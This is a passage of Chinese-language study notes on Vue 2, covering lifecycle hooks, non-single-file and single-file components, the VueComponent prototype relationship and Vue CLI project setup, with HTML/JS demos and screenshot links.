mounted():

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
        <h1>当前n的值 {{n}}</h1>
        <button @click="add">点我n+1</button>
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
           n:1
         },
         methods: {
            add(){
                this.n++;
            },
         
         },
         beforeCreate(){
         console.log('beforeCreate');   
         console.log(this);
        //  debugger;    
        },
        created(){
         console.log('created');   
         console.log(this);
        //  debugger;   
        },
        beforeMount(){
         console.log('beforeMounted');   
         console.log(this);
         //对DOM进行的操作最终是不奏效的
         document.querySelector('h1').innerText='尼玛';
        //  debugger;  
        },
        mounted() {
         console.log('mounted');   
         console.log(this);
         //对DOM进行的操作最终是奏效的
         document.querySelector('h1').innerText='尼玛';
         debugger;  
        },
     });
    </script>
</body>
</html>
~~~

----

![image-20221016232304106](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210162323343.png)

----





Demo: 测测将vue挂载到指定容器中，没有指定容器

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
        <h1>当前n的值 {{n}}</h1>
        <button @click="add">点我n+1</button>
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
    const vm=  new Vue({
        // 在控制台上挂载
    //    el:'#root' ,
       data:{
           n:1
         },
         methods: {
            add(){
                this.n++;
            },
         
         },
         beforeCreate(){
         console.log('beforeCreate');   
         console.log(this);
        //  debugger;    
        },
        created(){
         console.log('created');   
         console.log(this);
        //  debugger;   
        },
        beforeMount(){
         console.log('beforeMounted');   
         console.log(this);
         //对DOM进行的操作最终是不奏效的
         document.querySelector('h1').innerText='尼玛';
        //  debugger;  
        },
        mounted() {
         console.log('mounted');   
         console.log(this);
         //对DOM进行的操作最终是不奏效的
         document.querySelector('h1').innerText='尼玛';
        //  debugger;  
        },
     });
    </script>
</body>
</html>
~~~

---

![image-20221016233049896](C:\Users\fgcy\AppData\Roaming\Typora\typora-user-images\image-20221016233049896.png)

----



---

![image-20221016233141122](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210162331301.png)

---





Demo ：template配置项 

只要改动data中的元素就会触发 beforeUpdate() 函数

~~~html
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Document</title>
    </head>
    <body>
        <script src='../js/vue.js'></script>
        <div id='root' a="111">
            <h1>当前n的值 {{n}}</h1>
            <button @click="add">点我n+1</button>
        </div>
        <script type='text/javascript'>
        Vue.config.productionTip = false
        const vm=  new Vue({
            // 在控制台上挂载
        el:'#root' ,
            template:`
                <div>
                    <h1>当前n的值 {{n}}</h1>
                    <button @click="add">点我n+1</button>
                </div>
            `,
        data:{
            n:1
            },
            methods: {
                add(){
                    this.n++;
                },
            
            },
            beforeCreate(){
            console.log('beforeCreate');   
            console.log(this);
            //  debugger;    
            },
            created(){
            console.log('created');   
            console.log(this);
            //  debugger;   
            },
            beforeMount(){
            console.log('beforeMounted');   
            console.log(this);
            //对DOM进行的操作最终是不奏效的
            document.querySelector('h1').innerText='尼玛';
            //  debugger;  
            },
            mounted() {
            console.log('mounted');   
            console.log(this);
            //对DOM进行的操作最终是奏效的
            // document.querySelector('h1').innerText='尼玛';
            //  debugger;  
            },
            beforeUpdate(){
                console.log('beforeUpdate');   
                console.log(this)
                debugger;  
            }
        });
        </script>
    </body>
    </html>
~~~

---

![image-20221017230741513](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210172307284.png)

----

> 注意：template配置项 在最外层必须有一个根元素，没有就报错
>
> 而且vue会用 template中的东西全部替换掉 与该vue实例绑定的容器
>
> vm.$el存着 真实的dom节点 因为vue要与虚拟dom做 diff 比较 然后实现节点复用 所以要保存真实dom











~~~html
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Document</title>
    </head>
    <body>
        <script src='../js/vue.js'></script>
        <div id='root' a="111">
            <h1>当前n的值 {{n}}</h1>
            <button @click="add">点我n+1</button>
        </div>
        <script type='text/javascript'>
        Vue.config.productionTip = false
        const vm=  new Vue({
            // 在控制台上挂载
        el:'#root' ,
            template:`
                <div>
                    <h1>当前n的值 {{n}}</h1>
                    <button @click="add">点我n+1</button>
                </div>
            `,
        data:{
            n:1
            },
            methods: {
                add(){
                    this.n++;
                },
            
            },
            beforeCreate(){
            console.log('beforeCreate');   
            console.log(this);
            //  debugger;    
            },
            created(){
            console.log('created');   
            console.log(this);
            //  debugger;   
            },
            beforeMount(){
            console.log('beforeMounted');   
            console.log(this);
            //对DOM进行的操作最终是不奏效的
            document.querySelector('h1').innerText='尼玛';
            //  debugger;  
            },
            mounted() {
            console.log('mounted');   
            console.log(this);
            //对DOM进行的操作最终是奏效的
            // document.querySelector('h1').innerText='尼玛';
            //  debugger;  
            },
            beforeUpdate(){
                console.log('beforeUpdate');   
                console.log(this)
                // debugger;  
            },
            updated() {
                console.log('update');   
                console.log(this.n)
                debugger;  
            },
        });
        </script>
    </body>
    </html>
~~~

----

![image-20221018211957563](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210182120896.png)

----



















~~~~html
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Document</title>
    </head>
    <body>
        <script src='../js/vue.js'></script>
        <div id='root' a="111">
            <h1>当前n的值 {{n}}</h1>
            <button @click="add">点我n+1</button><br>
            <button @click="bye">点我销毁</button>
        </div>
        <script type='text/javascript'>
        Vue.config.productionTip = false
        const vm=  new Vue({
            // 在控制台上挂载
        el:'#root' ,
            template:`
                <div>
                    <h1>当前n的值 {{n}}</h1>
                    <button @click="add">点我n+1</button>
                    <br>
            <button @click="bye">点我销毁</button>
                </div>
            `,
        data:{
            n:1
            },
            methods: {
                add(){
                    this.n++;
                },
                bye(){
                    console.log('bye');
                    this.$destroy();
                }
            
            },
            beforeCreate(){
            console.log('beforeCreate');   
            console.log(this);
            //  debugger;    
            },
            created(){
            console.log('created');   
            console.log(this);
            //  debugger;   
            },
            beforeMount(){
            console.log('beforeMounted');   
            console.log(this);
            //对DOM进行的操作最终是不奏效的
            document.querySelector('h1').innerText='尼玛';
            //  debugger;  
            },
            mounted() {
            console.log('mounted');   
            console.log(this);
            //对DOM进行的操作最终是奏效的
            // document.querySelector('h1').innerText='尼玛';
            //  debugger;  
            },
            beforeUpdate(){
                console.log('beforeUpdate');   
                console.log(this)
                // debugger;  
            },
            updated() {
                console.log('update');   
                console.log(this.n)
                // debugger;  
            },
        });
        </script>
    </body>
    </html>
~~~~

----

![image-20221018212533831](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210182126336.png)

----





----

![image-20221018212730490](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210182127527.png)

----











~~~html
	    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Document</title>
    </head>
    <body>
        <script src='../js/vue.js'></script>
        <div id='root' a="111">
            <h1>当前n的值 {{n}}</h1>
            <button @click="add">点我n+1</button><br>
            <button @click="bye">点我销毁</button>
        </div>
        <script type='text/javascript'>
        Vue.config.productionTip = false
        const vm=  new Vue({
            // 在控制台上挂载
        el:'#root' ,
            template:`
                <div>
                    <h1>当前n的值 {{n}}</h1>
                    <button @click="add">点我n+1</button>
                    <br>
            <button @click="bye">点我销毁</button>
                </div>
            `,
        data:{
            n:1
            },
            methods: {
                add(){
                    console.log("add()");
                    this.n++;
                },
                bye(){
                    console.log('bye');
                    this.$destroy();
                }
            
            },
            beforeCreate(){
            console.log('beforeCreate');   
            console.log(this);
            //  debugger;    
            },
            created(){
            console.log('created');   
            console.log(this);
            //  debugger;   
            },
            beforeMount(){
            console.log('beforeMounted');   
            console.log(this);
            //对DOM进行的操作最终是不奏效的
            document.querySelector('h1').innerText='尼玛';
            //  debugger;  
            },
            mounted() {
            console.log('mounted');   
            console.log(this);
            //对DOM进行的操作最终是奏效的
            // document.querySelector('h1').innerText='尼玛';
            //  debugger;  
            },
            beforeUpdate(){
                console.log('beforeUpdate');   
                console.log(this)
                // debugger;  
            },
            updated() {
                console.log('update');   
                console.log(this.n)
                // debugger;  
            },
        });
        </script>
    </body>
    </html>
~~~

>  完全销毁一个实例。清理它与其它组件实例的连接，解绑它的全部指令及 自定义事件监听器（自定义事件而不是原生的js事件，因为原生js事件已经与真实的dom节点绑定好了。）

----

![image-20221018213433248](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210182134508.png)

----

















~~~html
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Document</title>
    </head>
    <body>
        <script src='../js/vue.js'></script>
        <div id='root' a="111">
            <h1>当前n的值 {{n}}</h1>
            <button @click="add">点我n+1</button><br>
            <button @click="bye">点我销毁</button>
        </div>
        <script type='text/javascript'>
        Vue.config.productionTip = false
        const vm=  new Vue({
            // 在控制台上挂载
        el:'#root' ,
            template:`
                <div>
                    <h1>当前n的值 {{n}}</h1>
                    <button @click="add">点我n+1</button>
                    <br>
            <button @click="bye">点我销毁</button>
                </div>
            `,
        data:{
            n:1
            },
            methods: {
                add(){
                    console.log("add()");
                    this.n++;
                },
                bye(){
                    console.log('bye');
                    this.$destroy();
                }
            
            },
            beforeCreate(){
            console.log('beforeCreate');   
            // console.log(this);
            //  debugger;    
            },
            created(){
            console.log('created');   
            // console.log(this);
            //  debugger;   
            },
            beforeMount(){
            console.log('beforeMounted');   
            // console.log(this);
            //对DOM进行的操作最终是不奏效的
            // document.querySelector('h1').innerText='尼玛';
            //  debugger;  
            },
            mounted() {
            console.log('mounted');   
            // console.log(this);
            // 对DOM进行的操作最终是奏效的
            // document.querySelector('h1').innerText='尼玛';
            //  debugger;  
            },
            beforeUpdate(){
                console.log('beforeUpdate');   
                // console.log(this)
                // debugger;  
            },
            updated() {
                console.log('update');   
                // console.log(this.n)
                // debugger;  
            },
            beforeDestroy() {
                console.log('update');   
                //到这个时期依旧可以访问到数据 函数 但此时即使使得data中的数据发生变化也不会触发更新 即页面不会变化
                this.add();
            },
        });
        </script>
    </body>
    </html>
~~~

---

![image-20221018214129779](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210182141138.png)

----

>  destroy（）这个方法 一般是不会用到的，了解一下







vm的一生（vm的生命周期）：


​			将要创建   --------》     调用beforeCreate函数
​			创建完毕   --------》     调用created图数。

​			将要挂载   --------》     调用beforeMount函数
(重要)  挂载完毕   --------》     调用mounted函数 [重要的钩子]

​			将要更新  ---------》   调用beforeUpdate函数。
​			更新完毕  ---------》  调用updated函数。
(重要)   将要销毁 ---------》调用beforeDestroy函数 [重要的钩子]

​			 销毁完毕 ---------》调用destroyed图数









Demo 生命周期的应用：

~~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>

    <!-- 又因为 js中对象名与对象值 名称相同时 可以写一个  -->
    <h1 v-bind:style="{opacity}">{{name}}</h1>
<br>
<button @click="stop">点我停止变化</button>

    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
     let vm= new Vue({
       el:'#root' ,
       data:{
           name:'学习 Vue',
           opacity:1
         },
         methods: {
            change(){
                setInterval(() => {
                    this.opacity-=0.01;
                    if(this.opacity<=0){
                        this.opacity=1;
                    }
                }, 16);
            },
            stop(){
                this.$destroy();
            }
         },
         mounted() {
            //Vue完成模板的解析并把初始的真实DON元素放入页面后（挂载完毕）调用mounted
            console.log('挂载');
           const id= setInterval(() => {
                    this.opacity-=0.01;
                    if(this.opacity<=0){
                        this.opacity=1;
                    }
                }, 16);
                this.timer=id;
         },
         beforeDestroy() {
            clearInterval(this.timer);
         },
     }); 
    </script>
</body>
</html>
~~~~

----

![image-20221018220530212](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210182206684.png)

----

常用的生命周期钩子；

1.mounted：发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】

2.beforeDestroy：清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】

关于销毁vue实例

1，销毁后借助vue开发者工具看不到任何信息，
2，销毁后自定义事件会失效，但原生DOM事件依然有效。
3，一般不会在beforeDestroy操作数据，因为即使操作数据，也不会再触发事新流程了





# 第 2 章：Vue 组件化编程

## 2.1 模块与组件、模块化与组件化





----

![image-20221018224103651](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210182241079.png)

----

> 样式 和 交互 有些可以复用 而 结构几乎都不能复用





理解组件 以及 认识组件化的好处：

-----

![image-20221018224653653](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210182246774.png)

-----









----

![image-20221018224930236](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210182249753.png)

----

> 组件的定义 ： 实现应用中局部功能代码和资源的集合





理解模块: 

向外提供特定功能的 js 程序, 一般就是一个 js 文件 （css html 没有模块之说）

为什么要使用模块 : js 文件很多很复杂 

模块的作用 : 复用 js, 简化 js 的编写, 提高 js 运行效率



理解组件: 

用来实现局部(特定)功能效果的代码集合 (html / css / js / image …..) 

为什么需要组件 : 一个界面的功能很复杂

组件作用: 复用编码, 简化项目编码, 提高运行效率



理解模块化：

当应用中的 js 都以模块来编写的, 那这个应用就是一个模块化的应用。





理解组件化：

当应用中的功能都是多组件的方式来编写的, 那这个应用就是一个组件化的应用,



模块化中的js文件<=组件化的js文件







## 2.2. 非单文件组件

特点：

- 模板编写没有提示 

- 没有构建过程, 无法将 ES6 转换成 ES5 

- 不支持组件的 CSS 

- 真正开发中几乎不用



### **Demo：一个文件中有多个组件：**

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>

    <div id='root'>
            <hello></hello>
            <hr>
            <h2>{{msg}}</h2>
            <hr>
            <xuexiao></xuexiao> 
        <hr>
            <xuesheng></xuesheng> 
            <!-- 实现复用 -->
            <xuesheng></xuesheng> 
    </div>


    <div id="root2">
        <hello></hello>
    </div>


    <script type='text/javascript'>
      Vue.config.productionTip = false;

    //第一步创建组件
     const school= Vue.extend({
        //e1：'#root',//组件定义时，一定不要写el配置顶，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器
        
        //data配置项一定要写成函数的形式 否则 报错
        /* 
            为什么要使用 成函数的形式 ?
            当使用对象时，且有多处使用这个组件 , 那么其中一个地方改变了这个对象的值 那么其他引用该对象的地方 这个值也会改变
        */
       template:`
            <div>
                <h2>学校名称:{{schoolName}}</h2>
                <h2>学校地址:{{address}}</h2>
                <button @click="show">点我提示学校名</button>
            </div>
       `,
        data(){
            return{
                schoolName:'头大',
                address:'中国'  
            }
        },
        methods: {
            show(){
                alert(this.schoolName);
            }
        },
      });


       //第一步创建组件
      const student=Vue.extend({
        template:`
            <div>
                <h2>学生名称：{{studentName}}</h2>
                <h2>学生年龄：{{age}}</h2>
            </div>
       `,
            data(){
                return{
                    studentName:'张三',
                    age:15
                }
            }
            
      });



      //第一步:创建组件
     const hello= Vue.extend({
        template:`
        <div>
            <h2>你好哇！{{name}}</h2>    
        </div>
        `,
        data(){
            return {
                name:'fgcy'
            }
        }
      });

      //第二步：全局注册组件
      Vue.component('hello',hello);


      new Vue({
       el:'#root' ,

       //第二步：注册组件（局部注册，当前实例有效）
       components:{
            xuexiao:school,
            xuesheng:student
       },
       data:{
        msg:'欢迎广陵'
       }
     });


        new Vue({
            el:'#root2',
        });
    </script>
</body>
</html>
~~~



-----

![image-20221018233603833](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210192055368.png)

-----





----

![image-20221018235204042](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210182352708.png)

----

小结：

**vue中使用组件的三大步骤：**
	一、定义组件（创建组件）

​	二、注册组件

​	三、使用组件（写组件标签）



**如何定义一个组件？**
使用 Vue.extend（options）创建，其中options和 new Vue（options）时传入的那个option  几乎一样，但也有点区别

区别如下：
		1.`el `不要写，为什么？最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器

​		2.data必须写成函数，为什么？避免组件被复用时，数据存在引用关系。

备注：使用template可以配置组件结构



**如何注册组件？**
1.局部注册：靠new Vue的时候传入components选项

2.全局注册：靠Vue.component（'组件名'，组件）



**编写组件标签**
`<school></schoo1>`





**几个注意点：**

1.关于组件名：

​	一个单词组成：

​			第一种写法（首字母小写）：school

​			第二种写法（首字母大写）：School

School多个单词组成：

​	第一种写法（kebab-case命名）：my-school

​	第二种写法（CamelCase命名）：MySchool（需要Vue脚手架支持)

备注：

（1）组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行
（2）可以使用name配置项指定组件  在开发者工具中  呈现的名字。【了解】



2.关于组件标签：

第一种写法：`<schoo1></school>` 

第二种写法：`<school/>`

备注：不用使用脚手架时，`<school/>`会导致后续组件不能渲染，



**创建组件简写方式：**

`const school = Vue.extend（options）`

同简写为：`const school = options`









### 组件嵌套：

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>

    <div id='root'>
            <school></school> 
    </div>

    <script type='text/javascript'>
      Vue.config.productionTip = false;


       //第一步创建组件
       const student=Vue.extend({
        template:`
            <div>
                <h2>学生名称：{{studentName}}</h2>
                <h2>学生年龄：{{age}}</h2>
            </div>
       `,
            data(){
                return{
                    studentName:'张三',
                    age:15
                }
            }
            
      });


    //第一步创建组件
     const school= Vue.extend({
       template:`
            <div>
                <h2>学校名称:{{schoolName}}</h2>
                <h2>学校地址:{{address}}</h2>
                <button @click="show">点我提示学校名</button>
                <student></student>
            </div>
       `,
        data(){
            return{
                schoolName:'头大',
                address:'中国'  
            }
        },
        methods: {
            show(){
                alert(this.schoolName);
            }
        },
        components:{
            student
        }
      });


      new Vue({
       el:'#root' ,

       //第二步：注册组件（局部注册，当前实例有效）
       components:{
            school
       }
     });

    </script>
</body>
</html>
~~~

----

![image-20221019205318298](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210192057807.png)

----









### 关于VueComponent：

1.school 组件本质是一个名为 VueComponent 的构造函数，且不是程序员定义的，是 vue.extend 生成的

2.我们只需要写  `<school/>` 或  `<school></schoo> ` Vue解析时会帮我们创建 school 组件的实例对象

即Vue帮我们执行的：`new VueComponent（options)`

3.特别注意：每次调用Vue.extend：返回的都是一个全新的VueComponent！！！！

4.关于 this 指向：

（1）组件配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】

（2）new Vue（）配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】

5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）

Vue的实例对象，以后简称vm：



~~~js
Vue.extend = function (extendOptions) {
	/*.......*/
	var Sub = function VueComponent(options){
		//console.1og（'VueComponent被调用了'）
    	this.init(options);
    }
    
	return Sub
}
~~~



~~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>

    <div id='root'>
        <school></school>
    </div>

    <script type='text/javascript'>
      Vue.config.productionTip = false;



    //创建组件 school
     const school= Vue.extend({
       template:`
            <div>
                <h2>学校名称:{{schoolName}}</h2>
                <h2>学校地址:{{address}}</h2>
                <button @click="showName">点我展示名字</button>
            </div>
       `,
        data(){
            return{
                schoolName:'头大',
                address:'中国'  
            }
        },
        methods: {
            showName(){
                console.log('当前实例对象:',this);
                alert(this.schoolName);
            }
        }
      });


      console.log('@@@',school);


      new Vue({
       el:'#root' ,
       components:{
         school
       }
     });

    </script>
</body>
</html>
~~~~

-----

![image-20221019215708817](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210192157343.png)



~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>

    <div id='root'>
        <student></student>
        <school></school>
    </div>

    <script type='text/javascript'>
      Vue.config.productionTip = false;

      const hello=Vue.extend({
            template:`
            <div>
               <h1>你好！！！</h1> 
            </div>
            `,
      });

       //创建组件 student
       const student=Vue.extend({
        template:`
            <div>
                <h2>学生名称：{{studentName}}</h2>
                <h2>学生年龄：{{age}}</h2>
            </div>
       `,
            data(){
                return{
                    studentName:'张三',
                    age:15
                }
            }
            
      });
    
        //创建组件 school
        const school= Vue.extend({
       template:`
            <div>
                <h2>学校名称:{{schoolName}}</h2>
                <h2>学校地址:{{address}}</h2>
                <button @click="showName">点我展示名字</button>
                <hello></hello>
            </div>
       `,
        data(){
            return{
                schoolName:'头大',
                address:'中国'  
            }
        },
        methods: {
            showName(){
                console.log('当前实例对象:',this);
                alert(this.schoolName);
            }
        },
        components:{
            hello
        }
      });

     const vm= new Vue({
       el:'#root' ,
       components:{
         school,
         student
       }
     });

    </script>
</body>
</html>
~~~

---

![image-20221019221127650](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210192211557.png)

----



## 一个重要的内置关系：

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <script type='text/javascript'>
      Vue.config.productionTip = false
            function Demo(){
                this.a=1;
                this.b=2;
            }

           const d= new Demo();
            console.log(Demo.prototype);//显示原型属性
            console.log(d.__proto__);//隐式原型属性

        //上面那两个东西都可以访问到原型对象
        //通过显示原型属性操作原型对象，追加一个x属性，值为100
        Demo.prototype.x=100;
        
        console.log('@@',d.__proto__.x);
        console.log('@',d.x);
    </script>
</body>
</html>
~~~

----

![image-20221019224040298](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210192243395.png)

----





----

![image-20221019224343599](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210192301249.png)

---

> d是一个由Demo 缔造出的对象
>
> d上没有x这个属性 但是d的原型对象上有











引入了 `vue.js ` 后，就可以使用 一个东西 `Vue`

----

![image-20221019230206778](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210192302037.png)

----

> 这个vue是一个构造函数



只要是函数 就必有一个 `prototype`属性（显示原型属性）

只要是对象 就必有一个 `__proto__`属性 （隐式原型属性）



记住：

实例的隐式原型属性 永远指向自己缔造者 的原型对象

缔造者是构造器





----

![image-20221019232408043](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210192324334.png)

-----

> 一个重要的内置关系： vueComponent的 原型对象 的 原型对象 就是 vue的原型对象
>
> 为什么要有这个关系：让组件实例对象（vc）可以访问到 vue原型上的属性、方法











~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
       <div id='root'>
            <student></student>
      </div>

    <script type='text/javascript'>
        Vue.prototype.x=100;
        //创建组件 student
       const student=Vue.extend({
        template:`
            <div>
                <h2>学生名称：{{studentName}}</h2>
                <h2>学生年龄：{{age}}</h2>
                <button @click="showVc">点我</button>
            </div>
       `,
            data(){
                return{
                    studentName:'张三',
                    age:15
                }
            },
            methods: {
                showVc(){
                    console.log('#',this.x);
                }
            },
            
      });
          Vue.config.productionTip = false;
            const vm =   new Vue({
                el:'#root',
                components:{
                    student
                }
            });

         
         console.log(student.prototype.__proto__=== Vue.prototype);
    </script>
</body>
</html>
~~~



----

![image-20221019233222334](C:\Users\fgcy\AppData\Roaming\Typora\typora-user-images\image-20221019233222334.png)

----







## 2.3 单文件组件

回顾组件的定义：实现局部功能 代码与资源的集合

非单文件组件的缺点：样式不能跟着组件走









# 第 3 章：使用 Vue 脚手





## 3.1 初始化脚手架

### 3.1.1 说明 

1. Vue 脚手架是 Vue 官方提供的标准化开发工具（开发平台）。 
1.  最新的版本是 4.x。 
1. 文档: https://cli.vuejs.org/zh/。





### 3.1.2 具体步骤

首先 配置 npm 淘宝镜像：`npm config set registry https://registry.npm.taobao.org`

第一步（仅第一次执行）：全局安装@vue/cli：`npm install -g @vue/cli`

第二步：切换到你要创建项目的目录，然后使用命令创建项目 `vue create 项目名`

​	语法转换 ES6 转 ES5  babel

​	eslint：用来做语法检查的

第三步：启动项目 `npm run serve`



### 3.1.3 模板项目的结构

----

![image-20221020224129437](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210202242395.png)

----

`.gitignore` : git的忽略文件

`babel.config.js` ：babel的配置文件 （不使用）

`package-lock.json` : 包管理工具

`package.json` : 包的说明书 





~~~
├── node_modules
├── public
│ ├── favicon.ico: 页签图标
│ └── index.html: 主页面
├── src
│ ├── assets: 存放静态资源
│ │ └── logo.png
│ │── component: 存放组件
│ │ └── HelloWorld.vue
│ │── App.vue: 汇总所有组件
│ │── main.js: 入口文件
├── .gitignore: git 版本管制忽略的配置
├── babel.config.js: babel 的配置文件
├── package.json: 应用包配置文件
├── README.md: 应用描述文件
├── package-lock.json：包版本控制文件

~~~





### 改造 helloWorld项目

创建vue项目  vue create first-demo

目录如下：

---

![image-20221021232954468](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210212329091.png)

----

School.vue

~~~vue
<template>
            <div>
                <h2>学校名称：{{name}}</h2>
                <h2>学校地址：{{address}}</h2>
                <button @click="showName">学校名称</button>
            </div>
</template>


<script>
    //默认暴露 vueComponent
     export default {
        //这里的名字是会展现在vue开发者工具中的
        name:'School',
        data(){
            return{
                name:'头大',
                address:'中国'  
            }
        },
        methods: {
            showName(){
                console.log('当前实例对象:',this);
                alert(this.name);
            }
        }
      };
</script>
<style scoped>
</style>
~~~



Student.vue

~~~vue
<template>
            <div>
                <h2>学生名称：{{name}}</h2>
                <h2>学生年龄：{{age}}</h2>
            </div>
</template>
<script>
    //默认暴露 vueComponent
     export default {
        //这里的名字是会展现在vue开发者工具中的
        name:'Student',
        data(){
            return{
                name:'fgcy',
                age:22  
            }
        }
      };

</script>
<style scoped>
</style>
~~~



App.vue

~~~vue
<template>
  <div>
    <img src="./assets/logo.png" alt="">
    <School></School>
    <Student></Student>
  </div>
</template>

<script>

//引入组件
import School from './components/School.vue';
import Student from './components/Student.vue';

export default {
    components:{
        School,
        Student
    }
}
</script>
~~~



main.js  **项目的入口文件**

~~~js
/* 
 *  该文件是整个项目的入口文件
*/

//引入vue 脚手架已经下好了
import Vue from 'vue'
//引入App组件，它是所有组件的父组件
import App from './App.vue'

//关闭vue的生产提示
Vue.config.productionTip = false

//创建vue实例对象  vm
new Vue({
  //将App组件放入容器中
   render: h => h(App),
}).$mount('#app')

~~~



index.html

~~~html
<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
    <!-- 针对IE浏览器的一个特殊配置，含义是让IE浏览器以最高的治染纷别治染页面 -->
    <!-- vue不支持 IE 8及其一下的版本 -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <!-- 开启移动端的理想视口 -->
    <meta name="viewport" content="width=device-width,initial-scale=1.0">

    <!-- 配置页签图标 -->
    <!-- <%= BASE_URL %> 代表 当前是在public目录下 -->
    <link rel="icon" href="<%= BASE_URL %>favicon.ico">

    <!-- 配置网页标题 -->
    <!-- 回去package.json 文件中找name -->
    <title><%= htmlWebpackPlugin.options.title %></title>
  </head>
  <body>


    <!-- 当浏览器不支持is时noscript中的元素就会被渲染 -->
    <noscript>
      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>


    <!-- 容器 -->
    <div id="app"></div>
    
    <!-- built files will be auto injected -->
  </body>
</html>

~~~











### 分析当前引入的vue

~~~js
/* 
